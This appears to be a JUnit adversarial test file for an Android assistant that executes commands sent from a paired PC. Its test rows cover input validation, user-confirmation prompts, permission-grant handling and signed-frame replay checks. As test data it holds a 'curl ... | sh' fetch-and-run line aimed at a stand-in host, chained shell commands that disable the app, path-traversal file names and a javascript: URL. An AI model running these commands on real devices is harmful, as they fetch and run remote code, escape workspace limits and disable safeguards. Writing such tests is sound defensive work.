package com.onesay.assistant.v2.pclink;

import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.junit.runners.Parameterized;

import java.io.File;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.TreeMap;

import static org.junit.Assert.*;

/**
 * 找茬 · 电脑 → 手机指令的执行端（PcRx.handle / onFrame）：开关、参数检查、电脑不能带「_」开头的内部标记、三条硬规则、
 * 原来拒的改成手机上确认（允许 / 拒绝 / 超时 / 记住 / 确认卡出错）、「以后这类不用问」、系统命令里的 pm 卸载、给 App 授权只生成脚本、
 * 剪贴板敏感标记、工作区外写入标记；以及整帧：只听配对的电脑、签名 / 重放 / 畸形帧、回帖签名与 re。
 * 每行 = 一条指令（或一帧）+ 手机侧状态 + 期望。
 */
@SuppressWarnings("unchecked")
@RunWith(Parameterized.class)
public class AdvPcRxTest {

    static final String SELF = "com.onesay.assistant";

    /** 假的手机执行端：开关全开（除非点名关）、记下 run 的参数、确认卡按预设回答。 */
    final class Fake implements PcRx.Handler, PcRx.Guard, PcRx.Asker {
        final Set<String> off = new HashSet<String>();
        int answer = PcConfirm.ALLOW;
        boolean askThrows, runThrows, autoClear;
        final List<String> asked = new ArrayList<String>(), remembered = new ArrayList<String>(), scripts = new ArrayList<String>();
        final List<String> kinds = new ArrayList<String>();
        Map<String, Object> ran;
        File ws;

        @Override public boolean enabled(String cmd) { return !off.contains(cmd); }

        @Override public PcLanClient.Result run(String cmd, Map<String, Object> args) {
            if (runThrows) throw new IllegalStateException("boom");
            ran = args;
            return new PcLanClient.Result(true, "done " + cmd, null, "");
        }

        @Override public void record(String cmd, boolean ok, String text) { }

        @Override public void appFacts(String cmd, Map<String, Object> args, LinkPolicy.Facts f) {
            String p = PcRxPolicy.str(args, "package");
            if (p.startsWith(SELF)) { f.appSelf = true; f.appBlocked = true; }
            if (p.startsWith("com.android.") || p.startsWith("com.x.system")) f.appSystem = true;
        }

        @Override public File workspace() { return ws; }

        @Override public String script(String cmd, Map<String, Object> args, String why) {
            scripts.add(cmd);
            return "scripts/grant-" + scripts.size() + ".sh";
        }

        @Override public int ask(String title, String detail, String rememberKind) {
            asked.add(rememberKind);
            if (askThrows) throw new IllegalStateException("ui");
            return answer;
        }

        @Override public Collection<String> rememberedKinds() { return kinds; }

        @Override public void remember(String kind) { remembered.add(kind); }

        @Override public boolean clipAutoClear() { return autoClear; }
    }

    /** {名字, cmd, args(JSON), 手机侧设置, 期望} 期望：run / run:<断言> / fail:<reason 或文字片段> / script / ask:<kind>:<结局>。 */
    static final String[][] ROWS = {
            {"unknown", "shutdown", "{}", "", "fail:手机不支持"},
            {"unknownCase", "Find_Phone", "{}", "", "fail:手机不支持"},
            {"disabled", "find_phone", "{}", "off:find_phone", "fail:没开"},
            {"find", "find_phone", "{}", "", "run"},
            {"findBadAction", "find_phone", "{\"action\":\"explode\"}", "", "fail:action"},
            {"volOk", "volume_set", "{\"percent\":50}", "", "run"},
            {"volFloat", "volume_set", "{\"percent\":50.7}", "", "run"},
            {"volHigh", "volume_set", "{\"percent\":101}", "", "fail:0–100"},
            {"volNeg", "volume_set", "{\"percent\":-1}", "", "fail:0–100"},
            {"volString", "volume_set", "{\"percent\":\"50\"}", "", "fail:0–100"},
            {"volMissing", "volume_set", "{}", "", "fail:0–100"},
            {"underscore", "notify", "{\"title\":\"t\",\"_sensitive\":true,\"_outside\":true,\"_clear\":true}", "", "run:noUnderscore"},
            {"notifyEmpty", "notify", "{}", "", "fail:没有内容"},
            {"notifyLong", "notify", "{\"title\":\"" + new String(new char[201]).replace('\0', 'x') + "\"}", "", "fail:太长"},
            {"urlIp", "open_url", "{\"url\":\"http://192.168.1.1/\"}", "", "run"},
            {"urlPrivate", "open_url", "{\"url\":\"http://nas.local/\"}", "", "run"},
            {"urlPlain", "open_url", "{\"url\":\"https://example.com/\"}", "", "run"},
            {"urlBare", "open_url", "{\"url\":\"example.com\"}", "", "fail:http"},
            {"urlJs", "open_url", "{\"url\":\"javascript:alert(1)\"}", "", "fail:http"},
            {"urlSpace", "open_url", "{\"url\":\"https://a.com/ x\"}", "", "fail:http"},
            {"urlCredAllow", "open_url", "{\"url\":\"https://u:p@example.com/\"}", "", "ask:phone.url.risky:run"},
            {"urlCredDeny", "open_url", "{\"url\":\"https://u:p@example.com/\"}", "answer:deny", "ask:phone.url.risky:fail:confirm_denied"},
            {"urlCredTimeout", "open_url", "{\"url\":\"https://u:p@example.com/\"}", "answer:timeout", "ask:phone.url.risky:fail:needs_confirm_timeout"},
            {"urlCredRemember", "open_url", "{\"url\":\"https://u:p@example.com/\"}", "answer:remember", "ask:phone.url.risky:run:remembered"},
            {"urlCredAlways", "open_url", "{\"url\":\"https://u:p@example.com/\"}", "answer:always", "ask:phone.url.risky:fail:confirm_denied"},
            {"urlCredAskThrows", "open_url", "{\"url\":\"https://u:p@example.com/\"}", "askThrows", "ask:phone.url.risky:fail:confirm_denied"},
            {"urlCredRemembered", "open_url", "{\"url\":\"https://u:p@example.com/\"}", "kinds:phone.url.risky", "run:noAsk"},
            {"urlLookalike", "open_url", "{\"url\":\"https://аpple.com/\"}", "", "ask:phone.url.risky:run"},
            {"urlRememberedOther", "open_url", "{\"url\":\"https://аpple.com/\"}", "kinds:phone.system_app", "ask:phone.url.risky:run"},
            {"appPlain", "open_app", "{\"package\":\"com.example.notes\"}", "", "run"},
            {"appBadPkg", "open_app", "{\"package\":\"com..x\"}", "", "fail:包名"},
            {"appNone", "open_app", "{}", "", "fail:哪个"},
            {"appPayLabel", "open_app", "{\"name\":\"支付宝\"}", "", "ask:phone.blocked_app.open:run"},
            {"appPayDeny", "open_app", "{\"name\":\"某某银行\"}", "answer:deny", "ask:phone.blocked_app.open:fail:confirm_denied"},
            {"uninstallSelf", "uninstall_app", "{\"package\":\"com.onesay.assistant\"}", "", "fail:self_grant_blocked"},
            {"uninstallSelfDebug", "uninstall_app", "{\"package\":\"com.onesay.assistant.debug\"}", "kinds:phone.blocked_app.uninstall", "fail:self_grant_blocked"},
            {"uninstallSystem", "uninstall_app", "{\"package\":\"com.android.chrome\"}", "", "ask:phone.system_app:run"},
            {"uninstallPlain", "uninstall_app", "{\"package\":\"com.example.game\"}", "", "run"},
            {"uninstallNoPkg", "uninstall_app", "{\"package\":\"game\"}", "", "fail:包名"},
            {"execGrant", "sys_exec", "{\"command\":\"pm grant com.x android.permission.CAMERA\"}", "", "script"},
            {"execGrantRemembered", "sys_exec", "{\"command\":\"pm grant com.x p\"}", "kinds:phone.system_app,phone.url.risky,phone.blocked_app.open,phone.blocked_app.uninstall", "script"},
            {"execA11y", "sys_exec", "{\"command\":\"settings put secure enabled_accessibility_services com.x/.A\"}", "", "script"},
            {"execUninstallSelf", "sys_exec", "{\"command\":\"pm uninstall com.onesay.assistant\"}", "", "fail:self_grant_blocked"},
            {"execUninstallSelfUser", "sys_exec", "{\"command\":\"pm uninstall --user 0 com.onesay.assistant\"}", "", "fail:self_grant_blocked"},
            {"execDisableSelf", "sys_exec", "{\"command\":\"pm disable-user --user 0 com.onesay.assistant\"}", "", "fail:self_grant_blocked"},
            {"execClearSelfChain", "sys_exec", "{\"command\":\"ls; pm clear com.onesay.assistant\"}", "", "fail:self_grant_blocked"},
            {"execUninstallSystem", "sys_exec", "{\"command\":\"pm uninstall -k --user 0 com.x.system.app\"}", "", "ask:phone.system_app:run"},
            {"execTwoAsks", "sys_exec", "{\"command\":\"pm hide com.x.system.a; pm suspend com.x.system.b\"}", "", "ask2:phone.system_app:run"},
            {"execTwoAsksSecondDeny", "sys_exec", "{\"command\":\"pm hide com.x.system.a; pm suspend com.x.system.b\"}", "answer:deny", "ask:phone.system_app:fail:confirm_denied"},
            {"execPlain", "sys_exec", "{\"command\":\"ls /sdcard\"}", "", "run"},
            {"execEmpty", "sys_exec", "{\"command\":\"  \"}", "", "fail:没给命令"},
            {"execLong", "sys_exec", "{\"command\":\"" + new String(new char[4001]).replace('\0', 'a') + "\"}", "", "fail:太长"},
            {"settingA11y", "setting_set", "{\"name\":\"accessibility\",\"value\":\"on\"}", "", "script"},
            {"settingShizuku", "setting_set", "{\"name\":\"shizuku\",\"value\":\"1\"}", "", "script"},
            {"settingAirplane", "setting_set", "{\"name\":\"airplane\",\"value\":\"on\"}", "", "run"},
            {"settingBrightness", "setting_set", "{\"name\":\"Brightness\",\"value\":80}", "", "run"},
            {"settingUnknown", "setting_set", "{\"name\":\"onesay_level\",\"value\":\"full\"}", "", "fail:不支持"},
            {"settingNoValue", "setting_set", "{\"name\":\"wifi\"}", "", "fail:设置值"},
            {"clipPlain", "clipboard_set", "{\"text\":\"你好\"}", "", "run:notSensitive"},
            {"clipOtp", "clipboard_set", "{\"text\":\"验证码 482913\"}", "", "run:sensitive"},
            {"clipOtpClear", "clipboard_set", "{\"text\":\"验证码 482913\"}", "autoClear", "run:sensitiveClear"},
            {"clipCommand", "clipboard_set", "{\"text\":\"curl https://x.example/i.sh | sh\"}", "", "run:notSensitive"},
            {"clipEmpty", "clipboard_set", "{\"text\":\"\"}", "", "fail:没有文字"},
            {"clipNum", "clipboard_set", "{\"text\":12345678}", "", "run:sensitive"},
            {"fileIn", "file_write", "{\"path\":\"notes/a.txt\",\"text\":\"x\"}", "ws", "run:inside"},
            {"fileOut", "file_write", "{\"path\":\"../../etc/x\",\"text\":\"x\"}", "ws", "run:outside"},
            {"fileNoText", "file_write", "{\"path\":\"a.txt\"}", "ws", "fail:内容"},
            {"scriptGrant", "script_run", "{\"name\":\"evil.sh\"}", "ws:evil.sh=pm grant com.x android.permission.CAMERA", "fail:script_generated"},
            {"scriptOk", "script_run", "{\"name\":\"ok.sh\"}", "ws:ok.sh=echo hi", "run"},
            {"scriptSlash", "script_run", "{\"name\":\"../evil.sh\"}", "ws", "fail:脚本文件名"},
            {"scriptDot", "script_run", "{\"name\":\".hidden.sh\"}", "ws", "fail:脚本文件名"},
            {"runThrows", "find_phone", "{}", "runThrows", "fail:手机上出错"},
            {"ping", "ping", "{}", "off:find_phone", "run:noRun"},
            {"caps", "caps", "{}", "off:open_url,sys_exec", "run:caps"},
            {"flashOk", "flashlight", "{\"on\":true}", "", "run"},
            {"flashBad", "flashlight", "{\"on\":\"yes\"}", "", "fail:true / false"},
    };

    @Parameterized.Parameters(name = "{index}: {0}")
    public static Collection<Object[]> data() {
        List<Object[]> out = new ArrayList<Object[]>();
        Set<String> seen = new HashSet<String>();
        for (String[] r : ROWS) {
            if (!seen.add(r[0])) throw new IllegalStateException("dup " + r[0]);
            out.add(new Object[]{r[0], r});
        }
        String[] frames = {"ok", "wrongFrom", "badSig", "replay", "stale", "notMsg", "noBody", "bodyNotObj", "garbage", "truncated", "deep", "huge",
                "confirmOfferUnsigned", "confirmCloseSigned", "kindResult", "argsNotObj", "nullCmd"};
        for (String f : frames) out.add(new Object[]{"frame:" + f, new String[]{"frame:" + f}});
        return out;
    }

    private final String[] row;
    private File tmp;

    public AdvPcRxTest(String name, String[] row) {
        this.row = row;
    }

    @Before public void setUp() {
        PcConfirm.reset();
    }

    @After public void tearDown() {
        PcConfirm.reset();
        if (tmp != null) del(tmp);
    }

    static void del(File f) {
        File[] l = f.listFiles();
        if (l != null) for (File x : l) del(x);
        f.delete();
    }

    @SuppressWarnings("unchecked")
    @Test public void handle() throws Exception {
        if (row[0].startsWith("frame:")) { frame(row[0].substring(6)); return; }
        Fake h = new Fake();
        for (String s : row[3].split(";")) {
            if (s.length() == 0) continue;
            if (s.startsWith("off:")) for (String c : s.substring(4).split(",")) h.off.add(c);
            else if (s.startsWith("kinds:")) for (String c : s.substring(6).split(",")) h.kinds.add(c);
            else if (s.equals("answer:deny")) h.answer = PcConfirm.DENY;
            else if (s.equals("answer:timeout")) h.answer = PcConfirm.TIMEOUT;
            else if (s.equals("answer:remember")) h.answer = PcConfirm.REMEMBER;
            else if (s.equals("answer:always")) h.answer = PcConfirm.ALWAYS;
            else if (s.equals("askThrows")) h.askThrows = true;
            else if (s.equals("runThrows")) h.runThrows = true;
            else if (s.equals("autoClear")) h.autoClear = true;
            else if (s.startsWith("ws")) {
                tmp = Files.createTempDirectory("adv-rx").toFile().getCanonicalFile();
                h.ws = tmp;
                new File(tmp, "scripts").mkdirs();
                if (s.startsWith("ws:")) {
                    String[] kv = s.substring(3).split("=", 2);
                    Files.write(new File(tmp, "scripts/" + kv[0]).toPath(), kv[1].getBytes("UTF-8"));
                }
            } else fail(s);
        }
        Map<String, Object> args = PcJson.obj(row[2]);
        PcLanClient.Result r = PcRx.handle(h, row[1], args);
        String want = row[4], at = row[0] + " → ok=" + r.ok + " text=" + r.text + " data=" + r.data;
        String reason = r.data.get("reason") == null ? "" : String.valueOf(r.data.get("reason"));
        if (want.startsWith("ask")) {
            int n = want.startsWith("ask2:") ? 2 : 1;
            String[] p = want.split(":", 3);
            assertEquals(at + " asked=" + h.asked, n, h.asked.size());
            for (String k : h.asked) assertEquals(at, p[1], k);
            want = p[2];
        } else {
            assertTrue(at + " 不该弹卡 asked=" + h.asked, h.asked.isEmpty());
        }
        if (want.startsWith("run")) {
            assertTrue(at, r.ok);
            String extra = want.length() > 4 ? want.substring(4) : "";
            if (extra.equals("noRun") || extra.equals("caps")) {
                assertNull(at + " ping / caps 不经执行端", h.ran);
                if (extra.equals("caps")) {
                    List<Object> caps = (List<Object>) r.data.get("caps");
                    assertFalse(caps.contains("open_url"));
                    assertFalse(caps.contains("sys_exec"));
                    assertTrue(caps.contains("find_phone"));
                    assertEquals(PcRxPolicy.ALL.length, ((List<Object>) r.data.get("known")).size());
                }
                return;
            }
            assertNotNull(at + " 应执行", h.ran);
            if (extra.equals("noUnderscore")) for (String k : h.ran.keySet()) assertFalse(at + " 电脑带的 " + k + " 不能进执行端", k.startsWith("_"));
            if (extra.equals("remembered")) assertEquals(at, "[phone.url.risky]", h.remembered.toString());
            else assertTrue(at + " 不该记住 " + h.remembered, h.remembered.isEmpty());
            if (extra.equals("sensitive")) { assertEquals(Boolean.TRUE, h.ran.get("_sensitive")); assertNull(h.ran.get("_clear")); }
            if (extra.equals("sensitiveClear")) { assertEquals(Boolean.TRUE, h.ran.get("_sensitive")); assertEquals(Boolean.TRUE, h.ran.get("_clear")); }
            if (extra.equals("notSensitive")) assertNull(h.ran.get("_sensitive"));
            if (extra.equals("inside")) assertNull(h.ran.get("_outside"));
            if (extra.equals("outside")) assertEquals(Boolean.TRUE, h.ran.get("_outside"));
            if (!extra.startsWith("sensitive") && !extra.equals("outside")) for (String k : h.ran.keySet()) assertFalse(k.startsWith("_"));
        } else if (want.equals("script")) {
            assertFalse(at, r.ok);
            assertEquals(at, LinkPolicy.R_SCRIPT_GENERATED, reason);
            assertEquals(at, 1, h.scripts.size());
            assertNull(at + " 授权命令不执行", h.ran);
            assertTrue(at, String.valueOf(r.data.get("path")).startsWith("scripts/"));
        } else if (want.startsWith("fail:")) {
            assertFalse(at, r.ok);
            assertNull(at + " 不该执行", h.ran);
            String w = want.substring(5);
            assertTrue(at + " 期望含 " + w, reason.equals(w) || r.text.contains(w));
            assertTrue(h.scripts.isEmpty());
        } else fail(want);
    }

    // ------------------------------------------------------------------ 整帧

    static final byte[] KEY = new byte[32];

    static {
        for (int i = 0; i < 32; i++) KEY[i] = (byte) (i + 40);
    }

    void frame(String name) throws Exception {
        PcLanClient.Peer p = new PcLanClient.Peer("ph1", "pc1", KEY, "", 47820, "");
        PcProtocol.ReplayGuard g = new PcProtocol.ReplayGuard();
        Fake h = new Fake();
        long now = System.currentTimeMillis();
        Map<String, Object> args = new TreeMap<String, Object>();
        args.put("title", "hi");
        Map<String, Object> body = PcProtocol.command(KEY, "m1", "pc1", "ph1", "notify", args, now);
        Map<String, Object> env = new TreeMap<String, Object>();
        env.put("type", "msg");
        env.put("from", "pc1");
        env.put("to", "ph1");
        env.put("id", "m1");
        env.put("body", body);
        String text = PcJson.stringify(env);
        String got;
        if (name.equals("ok") || name.equals("replay")) {
            got = PcRx.onFrame(p, g, h, text, now);
            assertNotNull(got);
            Map<String, Object> re = PcJson.obj(got);
            Map<String, Object> rb = (Map<String, Object>) re.get("body");
            assertEquals("回帖签名可验", PcProtocol.Check.OK, PcProtocol.verify(KEY, String.valueOf(re.get("id")), "ph1", "pc1", rb, now, null));
            assertEquals("m1", rb.get("re"));
            assertEquals(Boolean.TRUE, rb.get("ok"));
            assertNotNull(h.ran);
            if (name.equals("replay")) {
                h.ran = null;
                String again = PcRx.onFrame(p, g, h, text, now + 10);
                Map<String, Object> ab = (Map<String, Object>) PcJson.obj(again).get("body");
                assertEquals(Boolean.FALSE, ab.get("ok"));
                assertTrue(String.valueOf(ab.get("text")).contains("REPLAY"));
                assertNull("重放不执行", h.ran);
            }
            return;
        }
        if (name.equals("wrongFrom")) { env.put("from", "pc2"); got = PcRx.onFrame(p, g, h, PcJson.stringify(env), now); assertNull(got); assertNull(h.ran); return; }
        if (name.equals("badSig") || name.equals("stale") || name.equals("argsNotObj") || name.equals("nullCmd")) {
            Map<String, Object> b2 = new TreeMap<String, Object>(body);
            long when = now;
            if (name.equals("badSig")) { Map<String, Object> a2 = new TreeMap<String, Object>(args); a2.put("title", "pwn"); b2.put("args", a2); }
            if (name.equals("stale")) { b2 = PcProtocol.command(KEY, "m1", "pc1", "ph1", "notify", args, now - PcProtocol.MAX_SKEW_MS - 1); }
            if (name.equals("argsNotObj")) { b2.remove("sig"); b2.put("args", "x"); b2 = PcProtocol.seal(KEY, "m1", "pc1", "ph1", b2, now); }
            if (name.equals("nullCmd")) { b2.remove("sig"); b2.remove("cmd"); b2 = PcProtocol.seal(KEY, "m1", "pc1", "ph1", b2, now); }
            env.put("body", b2);
            got = PcRx.onFrame(p, g, h, PcJson.stringify(env), when);
            assertNotNull(got);
            Map<String, Object> rb = (Map<String, Object>) PcJson.obj(got).get("body");
            assertEquals(Boolean.FALSE, rb.get("ok"));
            if (name.equals("badSig")) assertTrue(String.valueOf(rb.get("text")).contains("BAD_SIG"));
            if (name.equals("stale")) assertTrue(String.valueOf(rb.get("text")).contains("STALE"));
            if (name.equals("argsNotObj")) assertTrue("args 不是对象 = 没有参数 → 参数检查不过", String.valueOf(rb.get("text")).contains("没有内容"));
            if (name.equals("nullCmd")) assertTrue(String.valueOf(rb.get("text")).contains("不支持"));
            assertNull("不执行", h.ran);
            return;
        }
        String bad = name.equals("notMsg") ? text.replace("\"msg\"", "\"ack\"")
                : name.equals("noBody") ? "{\"type\":\"msg\",\"from\":\"pc1\",\"id\":\"m1\"}"
                : name.equals("bodyNotObj") ? "{\"type\":\"msg\",\"from\":\"pc1\",\"id\":\"m1\",\"body\":\"x\"}"
                : name.equals("garbage") ? "\u0000\u0001not json"
                : name.equals("truncated") ? text.substring(0, text.length() / 2)
                : name.equals("deep") ? "{\"type\":\"msg\",\"body\":" + new String(new char[100]).replace("\0", "[") + "}"
                : name.equals("huge") ? "{\"type\":\"msg\",\"from\":\"pc1\",\"id\":\"m1\",\"body\":{\"kind\":\"cmd\",\"cmd\":\"notify\",\"pad\":\"" + new String(new char[2_000_000]).replace('\0', 'x') + "\"}}"
                : name.equals("kindResult") ? text.replace("\"kind\":\"cmd\"", "\"kind\":\"result\"")
                : null;
        if (name.equals("confirmOfferUnsigned") || name.equals("confirmCloseSigned")) {
            Map<String, Object> cb = new TreeMap<String, Object>();
            cb.put("kind", name.equals("confirmOfferUnsigned") ? "confirm_offer" : "confirm_close");
            cb.put("cid", 5L);
            cb.put("token", "tok-0123456789abcdef");
            Map<String, Object> e2 = new TreeMap<String, Object>(env);
            e2.put("body", name.equals("confirmCloseSigned") ? PcProtocol.seal(KEY, "m1", "pc1", "ph1", cb, now) : cb);
            bad = PcJson.stringify(e2);
        }
        got = PcRx.onFrame(p, g, h, bad, now);
        if (name.equals("huge")) {
            assertNotNull("超大但签名不对的帧：回拒绝，不执行", got);
            assertEquals(Boolean.FALSE, ((Map<String, Object>) PcJson.obj(got).get("body")).get("ok"));
        } else assertNull(name, got);
        assertNull(name + " 不执行", h.ran);
        assertFalse(PcConfirm.anyPending());
    }
}
